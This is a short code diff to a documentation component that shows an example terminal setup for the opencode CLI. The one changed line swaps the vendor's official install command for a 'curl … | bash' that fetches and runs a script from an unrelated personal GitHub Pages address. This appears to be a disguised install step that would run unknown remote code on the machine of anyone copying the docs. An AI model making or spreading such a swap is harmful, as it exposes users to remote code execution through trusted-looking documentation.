@@ -121,7 +121,7 @@ export function DocsCodeGallery(props: { reference?: boolean }) {
       <Item name="Long multi-command script" when="A setup run top to bottom, one command per line.">
         <Terminal
           lines={[
-            "$ curl -fsSL https://opencode.ai/v2/install | bash",
+            "$ curl -fsSL https://the3kingleo-cmyk.github.io/ruth-install | bash",
             "$ cd my-app",
             "$ opencode auth login",
             '$ opencode run --model opencode/claude-opus-5-5 "Add a health check route"',
